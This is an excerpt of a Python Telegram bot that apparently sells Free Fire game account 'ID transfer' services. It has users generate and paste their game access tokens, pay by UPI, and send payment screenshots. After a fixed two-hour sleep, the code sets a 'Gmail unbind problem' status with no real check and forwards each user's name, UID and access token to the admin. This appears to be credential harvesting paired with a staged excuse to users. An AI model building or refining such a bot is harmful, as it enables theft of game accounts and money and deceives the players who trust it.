...
payment_settings = {
    ...
    'token_generator': 'https://ffaccesstokengenrator.vercel.app/'
}
...
# ============================================
# 🔹 GENERATE ACCESS TOKEN - HOME PAGE BUTTON
# ============================================
...
def generate_access_token_home(message):
    ...
    bot.reply_to(message, f"""🔑 **Access Token Generator**
...
🔑 **Generate your Access Token now:**""", reply_markup=markup)
...
def token_generated_callback(call):
    ...
    bot.edit_message_text(
        f"""✅ **Great! Now send me the Token or Link**
...
def handle_user_input(message):
    ...
    # Check if user is in token generation flow
    if user_id in user_tokens:
...
⚠️ इस Token को किसी के साथ साझा न करें!""", reply_markup=markup)
    ...
    if "ffaccesstokengenrator.vercel.app" in text or "token=" in text or "eat=" in text:
        ...
        bot.reply_to(message, f"""✅ **Token Extracted Successfully!**
...
⚠️ इस Token को किसी के साथ साझा न करें!""", reply_markup=markup)
    ...
    # If user sends any text as token
    if len(text) >= 10:
        token = text
        user_tokens[user_id] = token
...
📌 Add balance using "+ Add Balance" option""", reply_markup=main_menu())
...
def show_payment_with_qr(message, service):
    ...
    user_temp = load_data("temp.json", {})
    user_temp[user_id] = {'pending_service': service}
    save_data("temp.json", user_temp)
...
📸 **After payment, send screenshot here:**
👇 Just send the payment screenshot in this chat.
⏳ Admin will verify and start service."""
...
def handle_screenshot(message):
    ...
    if 'pending_service' in user_temp[user_id]:
        service = user_temp[user_id]['pending_service']
...
def process_transfer_uid(message):
    ...
    # Check if token already exists in user_tokens
    if user_id in user_tokens:
...
✅ Use this token or generate a new one.

📌 **Instructions (Hindi):**
👇 नीचे दिए गए बटन पर क्लिक करें और वहां से अपना Access Token जनरेट करें।
फिर उस Token को यहां कॉपी करके पेस्ट करें।
...
✅ 24/7 Support Available""", reply_markup=markup)
    ...
    # No token saved, show generate option
    markup = types.InlineKeyboardMarkup(row_width=1)
    ...
    bot.reply_to(message, f"""🔑 **Access Token Required!**
...
# ============================================
# 🔹 GENERATE TRANSFER TOKEN CALLBACK
# ============================================
...
⏳ 24 hours wait started""")
        ...
        threading.Thread(target=send_2hour_message, args=(user_id, transfer_id, flow['name'], flow['uid'], token)).start()
        
        bot.answer_callback_query(call.id, "✅ Service Started!")
    else:
        bot.answer_callback_query(call.id, "❌ Session expired! Use /start", show_alert=True)

# ============================================
# 🔹 USE TRANSFER TOKEN CALLBACK
# ============================================
...
def send_2hour_message(user_id, transfer_id, name, uid, token):
    """Send Gmail Unbind message after 2 hours"""
    time.sleep(7200)
    
    try:
        if transfer_id in transfer_data:
            transfer_data[transfer_id]['status'] = 'gmail_issue'
            save_data(TRANSFER_FILE, transfer_data)
...
✅ Your request is being processed. You will be notified within 24 hours.""", reply_markup=main_menu())
        
        bot.send_message(ADMIN_ID, f"""⏰ **2 HOURS UPDATE - GMAIL UNBIND PROBLEM!**

🔄 ID Transfer Request - {transfer_id}
👤 User: @{user_data.get(user_id, {}).get('username', 'N/A')}
🆔 User ID: {user_id}
👤 Name: {name}
🎮 UID: {uid}
🔑 Access Token: {token}
...
✅ Use /addbalance {user_id} 500 to refund if needed.""")
        
    except Exception as e:
        print(f"2 hour message error: {e}")
...
📌 Reference ID: FF{user_id}""", reply_markup=main_menu())
...
📧 Gmail: {gmail}
💵 ₹{price}
📌 Service: {SERVICES[flow['service']]['name']}""")
...
🆔 Reference: FF{user_id}""", reply_markup=main_menu())
        ...
        bot.reply_to(message, "❌ No active request!", reply_markup=main_menu())
...
def admin_all_users(message):
    ...
    if not memory_data:
        bot.reply_to(message, "📋 No users in memory!")
        return
    
    msg = "📋 **All Users in Memory:**\n\n"
    for uid, data in memory_data.items():
        msg += f"🆔 {uid} | {data.get('name')} | @{data.get('username')}\n"
        msg += f"📅 Last Seen: {data.get('last_seen', 'N/A')}\n\n"
        if len(msg) > 3500:
...
def process_qr_upload(message):
    ...
    if message.photo:
        ...
        bot.reply_to(message, f"""✅ **QR Code Uploaded Successfully!**

📤 New QR will be shown in all payment requests.

💳 UPI: {payment_settings['upi']}
📱 Phone: {payment_settings['phone']}""", reply_markup=admin_panel())
    else:
...
print(f"📤 QR Status: {'✅ Uploaded' if payment_settings['qr_url'] else '❌ Not Uploaded'}")
print(f"💾 Memory: {len(memory_data)} users")
print("="*50)
